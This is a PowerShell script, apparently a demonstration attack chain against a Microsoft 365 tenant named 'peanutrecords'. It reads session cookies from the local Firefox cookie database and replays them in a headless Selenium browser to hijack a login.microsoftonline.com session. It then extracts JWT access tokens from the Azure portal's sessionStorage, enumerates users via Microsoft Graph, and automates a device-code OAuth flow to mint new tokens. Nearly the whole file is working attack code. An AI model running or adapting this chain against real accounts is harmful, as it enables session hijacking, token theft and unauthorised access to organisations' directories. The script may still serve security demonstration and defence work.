# Module Requirements:
#  - Import-Module Selenium
#  - Import-Module SQLite

#region 01 Extract Cookies

function Get-IsProgramInstalled {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Name
    )
    
    $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    $registryPathWow64 = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"

    (Get-ChildItem $registryPath, $registryPathWow64 | Get-ItemProperty).DisplayName -like "*$Name*"
}

function Get-CookiesPath {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Path
    )

    return (Get-ChildItem -Path $Path -Recurse -File | Where-Object { $_.Name -eq "cookies.sqlite" }).FullName
}

function Get-FirefoxCookies {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Url
    )

    If (Get-IsProgramInstalled -Name "Firefox") {
        $CookiesPath = Get-CookiesPath -Path "$env:APPDATA\Mozilla\Firefox\Profiles\"
        $Query = "SELECT * FROM moz_cookies WHERE host LIKE '%$Url%'"
        return Invoke-SqliteQuery -DataSource $CookiesPath -Query $Query
    }
    else {
        Write-Debug "Firefox is not installed. No cookies for the cookie monster :("
    }
}

$Cookies = Get-FirefoxCookies -Url "login.microsoftonline.com"

#endregion

#region 02 Replay Cookies

function Set-Cookies {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [Object[]]$Cookies
    )

    $Cookies | ForEach-Object {
        try {
            $expiry = [datetime]::UnixEpoch.AddSeconds($_.expiry)
            Write-Debug "###############################################################"
            $seleniumCookie = New-Object OpenQA.Selenium.Cookie($_.name, $_.value, $_.host, $_.path, $expiry)
            Write-Debug $seleniumCookie
            $Script:Driver.Manage().Cookies.AddCookie($seleniumCookie)
        }
        catch {
            Write-Error "Cookies could not be accessed, so no cookies were replayed. No cookies for the cookie monster :("
        }
    }
}

$Script:Driver = Start-SeFirefox -Headless

$Script:Driver.Navigate().GoToUrl("https://login.microsoftonline.com")
$Script:Driver.Manage().Cookies.AllCookies | Select-Object name, domain, value

Set-Cookies -Cookies $Cookies -Debug
$Script:Driver.Manage().Cookies.AllCookies | Select-Object name, domain, value

$Script:Driver.Navigate().GoToUrl("https://portal.azure.com")

#endregion

#region 03 Extract Access Token

function Get-JWTTokens {
    [cmdletbinding()]
    param ()

    $keys = $Script:Driver.ExecuteScript("return Object.keys(window.sessionStorage);")
    $JwtTokens = foreach ($key in $keys) {
        $value = $Script:Driver.ExecuteScript("return window.sessionStorage.getItem(arguments[0]);", $key)
        try {
            $json = $value | ConvertFrom-Json
            if ($json.secret -match "^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$") {

                [PSCustomObject]@{
                    Key = $key
                    JWT = $json.secret
                    CredentialType = $json.credentialType
                    CachedAt = [datetime]::UnixEpoch.AddSeconds($json.cachedAt)
                    ExpiresOn = [datetime]::UnixEpoch.AddSeconds($json.expiresOn)
                    ExtendedExpiresOn = [datetime]::UnixEpoch.AddSeconds($json.extendedExpiresOn)
                    Environment = $json.environment
                    ClientId = $json.clientId
                    Realm = $json.realm
                    Target = $json.target
                    TokenType = $json.tokenType
                }
                Write-Debug "JWT FOUND IN KEY: $key"
            } else {
                Write-Debug "Token in key $key does not appear to be a valid JWT."
            }
        } catch {
            Write-Debug "Failed to parse value for key: $key"
        }
    }
    return $JwtTokens
}
$JwtTokens = Get-JWTTokens

$JwtTokens | ft credentialType, ExpiresOn, Key

$AccessToken = $JwtTokens | Where-Object { $_.CredentialType -eq ("AccessToken") -and $_.Target -like "*Organization.Read.All*" } | Select-Object -ExpandProperty JWT 

#endregion

#region 04 Trying to reuse the access token
function Invoke-GraphWebRequest {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory)]
        [string]$AccessToken,
        [PSCustomObject]$BodyAsJson,
        [Parameter(Mandatory)]
        [string]$RequestUri,
        [string]$HttpMethod = "GET"
    )

    $Header = @{
        "Authorization" = "Bearer $AccessToken"
        "Content-Type"  = "application/json"
    }

    $Params = @{
        Headers = $Header
        uri     = $RequestUri
        Body    = $BodyAsJson
        method  = $HttpMethod
    }
    
    try
    {
        $Request = Invoke-RestMethod @Params -UserAgent "MSGraphSecurityTestKit"
    }
    catch {
        throw $_
    }
    return $Request
}

# Find UPNs of all peanutrecord users
$HttpMethod = "GET"
$RequestUri = "https://graph.microsoft.com/v1.0/users/"

$Response = Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod $HttpMethod

$Response.value | Where-Object { $_.mail -and $_.userPrincipalName -like "*peanutrecords*"}

$AccessToken | Set-Clipboard
#endregion

#region 05 Perform Device Authentication

function Get-DeviceAuthentication {
    [cmdletbinding()]
    param (
        [string]$ClientId = "1950a258-227b-4e31-a9cf-717495945fc2", # Microsoft Azure PowerShell
        [string]$GraphResource = "https://graph.microsoft.com/.default"
    )
    
    $response = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body @{
        client_id   = $ClientId
        scope       = $GraphResource
    } -ContentType "application/x-www-form-urlencoded"
    
    return $response
}

$DeviceAuth = Get-DeviceAuthentication

$DeviceCode = $DeviceAuth | Select-Object -ExpandProperty device_code
$UserCode   = $DeviceAuth | Select-Object -ExpandProperty user_code
$VerificationUri = $DeviceAuth | Select-Object -ExpandProperty verification_uri


function Get-AccessToken {
    [cmdletbinding()]
    param (
        [string]$ClientId = "1950a258-227b-4e31-a9cf-717495945fc2", # Microsoft Azure PowerShell
        [string]$UserCode,
        [string]$VerificationUri,
        [string]$DeviceCode
    )

    $Script:Driver.Navigate().GoToUrl($VerificationUri)
    Start-Sleep -Seconds 2

    # Enter the code
    $Script:Driver.FindElementById("otc").SendKeys($UserCode)
    $Script:Driver.FindElementById("idSIButton9").Click()
    Start-Sleep -Seconds 2

    $Script:Driver.FindElementByXPath("/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div[2]/div/div[3]/div/div/div/div[3]/div/div/div[1]/div/div[1]").Click()
    Start-Sleep -Seconds 2

    $Script:Driver.FindElementById("idSIButton9").Click()


    do {
        Start-Sleep -Seconds 5
        $tokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body @{
            grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
            client_id   = $ClientId
            device_code = $DeviceCode
        } -ContentType "application/x-www-form-urlencoded"
    } while ($tokenResponse.error -eq "authorization_pending")

    return $tokenResponse.access_token
}


$AccessToken = Get-AccessToken -UserCode $UserCode -DeviceCode $DeviceCode -VerificationUri $VerificationUri

$AccessToken | Set-Clipboard

#endregion

#region 06 Reuse Access Token

# Find UPNs of all peanutrecord users
$Response = Invoke-GraphWebRequest -AccessToken $AccessToken -RequestUri $RequestUri -HttpMethod $HttpMethod
$Response.value | Where-Object { $_.mail -and $_.userPrincipalName -like "*peanutrecords*"}

Stop-SeDriver $Script:Driver

#endregion